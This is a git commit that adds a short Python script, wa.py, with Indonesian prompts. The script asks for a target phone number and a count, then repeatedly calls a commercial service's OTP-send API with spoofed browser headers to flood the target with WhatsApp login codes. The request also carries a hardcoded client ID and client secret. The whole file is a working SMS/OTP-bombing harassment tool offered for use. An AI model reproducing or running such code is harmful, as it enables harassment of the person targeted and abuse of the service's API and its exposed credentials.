9e958d5059cd47076033737332487e75293a3960
Alexxzz1 <108179991+Alexxzz1@users.noreply.github.com>
2022-11-25 11:02:40 +0700

    Add files via upload

---
+++ wa.py
@@ -0,0 +1,13 @@
+py
+import os,sys,json,requests
+from requests import get,post
+
+os.system("clear")
+print("Gausah pakek +62 langsung 0")
+
+nomor = input("Nomor Target : ")
+jum = int(input("Jumlah Spam : "))
+for i in range(jum):
+  kon = requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={"Host":"api-v2.bukuwarung.com","content-length":"198","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","x-app-version-name":"android","accept":"application/json, text/plain, */*","x-app-version-code":"3001","buku-origin":"tokoko-web","sec-ch-ua-platform":"Android","origin":"https://tokoko.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://tokoko.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
+    
+print("Telash di kirim")
